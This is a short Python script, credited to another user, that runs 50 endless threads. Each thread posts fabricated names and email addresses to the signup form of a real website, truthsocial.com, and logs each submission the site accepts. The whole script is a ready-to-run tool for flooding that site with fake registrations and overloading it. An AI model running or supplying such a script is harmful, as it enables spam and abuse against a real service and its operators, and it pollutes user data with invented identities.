#credit to @inh2102

import requests
import threading
import random
import time

url = 'https://www.truthsocial.com/'

first_names = open('names.txt','r').read().split('\n')
last_names = [x.title() for x in open('last_names.txt','r').read().split('\n')]
domains = ['gmail.com','yahoo.com','hotmail.com','icloud.com','aol.com',
           'comcast.net','outlook.com','sbcglobal.net','msn.com']

def do_request():
    while True:
        first = random.choice(first_names)
        last = random.choice(last_names)
        email = first+random.choice(['-','.','_'])+last+"@"+random.choice(domains)
        data = {
        'first_name': first,
        'last_name': last,
        'email': email,
        'phone': '',
        'offers': 'on'
       }
        response = requests.post(url,data=data).text
        
        if "Thanks" in response:
            print("Success with"+" "+str(first)+" "+str(last)+" "+str(email))
            
threads = []

for i in range(50):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)
    
for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()
